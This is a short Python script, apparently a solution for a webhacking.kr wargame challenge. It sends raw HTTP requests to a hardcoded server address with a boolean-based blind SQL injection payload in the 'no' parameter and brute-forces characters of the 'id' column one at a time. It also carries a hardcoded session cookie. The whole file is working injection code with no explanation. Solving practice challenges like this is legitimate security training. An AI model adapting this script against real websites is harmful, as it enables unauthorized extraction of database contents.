import socket

string = ""
for x in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
    send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    data = "GET /challenge/bonus/bonus-1/index.php?no=1512341+or+1+and+no%3d1+and+ord(substr(id,1,1))%3dord('" + x + "')+%23 HTTP/1.1\r\n" + \
           "Host: webhacking.kr\r\n" + \
           "Cookie: PHPSESSID=7992ad10c8d4a873542afd1ba7b5d409\r\n" + \
           "\r\n"

    send.connect(("183.111.174.96", 80))
    send.send(data.encode())
    recv = send.recv(3000)
    if "True" in recv.decode():
        string += x
        print(string)
        break

    send.close()
